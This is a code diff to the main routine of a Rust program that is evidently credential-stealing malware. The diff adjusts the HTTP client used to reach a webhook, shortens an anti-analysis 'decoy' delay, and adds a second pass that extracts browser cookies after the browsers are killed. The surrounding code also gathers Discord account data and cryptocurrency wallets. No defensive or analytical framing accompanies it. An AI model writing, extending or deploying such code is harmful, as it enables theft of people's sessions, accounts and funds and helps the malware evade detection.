@@ -143,18 +143,26 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     browsers::common::ci::cleanup_legacy_artifacts();
 
     let wbh = get_webhook_url();
-    let client = reqwest::Client::new();
+    let client = reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(30))
+        .connect_timeout(std::time::Duration::from_secs(10))
+        .build()
+        .unwrap_or_else(|_| reqwest::Client::new());
 
     let (_discord_accounts, discord_content, embeds) = crate::discord::get_discord_data(&client).await;
 
     let _ = core::decoy::read_system_files();
     let _ = core::decoy::read_config_files();
     let _ = core::decoy::calculate_fibonacci(50);
-    std::thread::sleep(std::time::Duration::from_millis(1500));
+    std::thread::sleep(std::time::Duration::from_millis(300));
 
     let mut all_files = browsers::run();
 
     core::kill::kill_browsers();
+
+    // Browsers are closed — retry cookie extraction with cached master keys.
+    let cookie_retry = browsers::chromium::extract_cookies_post_kill();
+    browsers::merge_files(&mut all_files, cookie_retry);
 
     let wallet_files = wallet::collect_wallets();
     for (name, content) in wallet_files {
